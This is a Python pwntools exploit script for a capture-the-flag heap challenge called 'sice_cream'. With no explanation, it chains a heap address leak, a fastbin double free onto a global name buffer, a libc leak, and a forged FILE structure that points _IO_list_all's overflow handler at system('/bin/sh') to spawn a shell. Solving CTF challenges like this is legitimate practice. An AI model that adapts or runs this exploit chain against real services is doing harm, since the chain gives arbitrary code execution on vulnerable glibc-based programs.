#!/usr/bin/env python3
from this import d
from pwn import *
elf = context.binary = ELF("./sice_cream")
p = process("./sice_cream")
libc = ELF("./libc-2.23.so")
gdb.attach(p,"init-pwndbg")

def set_name(name):
    p.sendafter("> ",name)

def malloc(size,data):
    p.sendlineafter("> ","1")
    p.sendlineafter("> ",str(size))
    p.sendafter("> ",data)

def free(index):
    p.sendlineafter("> ","2")
    p.sendlineafter("> ",str(index))

def change_name(name):
    p.sendlineafter("> ","3")
    p.sendafter("> ",name)

name_buf = 0x602040
set_name(b'a'*8)
malloc(0x38,'b'*8)
malloc(0x38,b'c'*8)
change_name(b'a'*0x100)
p.recvuntil(b'a'*0x100)
leak = p.recvline()[:-2]
leak = leak.ljust(8,b'\x00')
leak = u64(leak)
heap_base = leak-0x10
log.critical("Heap base address: {}".format(hex(heap_base)))
change_name(p64(0x0)+p64(0x41)+b'\x00'*0xf0)
free(0)
free(1)

free(0)
malloc(0x38,p64(name_buf))
malloc(0x38,b'b'*8)
malloc(0x38,b'c'*8)
malloc(0x38,b'd'*8)
change_name(p64(0x0)+p64(0x91)+b'a'*0x80+p64(0x0)+p64(0x21)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x21))
free(5)
change_name(b'a'*24)
p.recvuntil('a'*24)
leak = p.recvline()[:-2]
leak = leak.ljust(8,b'\x00')
leak = u64(leak)
print(hex(leak))
libc.address = leak - 0x399b78
log.critical("Libc base address: {}".format(hex(libc.address)))

flags = b"/bin/sh\x00"
size = 0x61
fd = 0x0
bk = libc.sym._IO_list_all - 0x10
write_base = 0x1
write_ptr = 0x2
mode = 0x0
overflow = libc.sym.system
vtable_ptr = 0x6020f8
payload = flags+p64(size)+p64(fd)+p64(bk)+p64(write_base)+p64(write_ptr)+p64(0x0)*18+p32(mode)+p32(0x0)+p64(0x0)+p64(overflow)+p64(vtable_ptr)
change_name(payload)

p.interactive()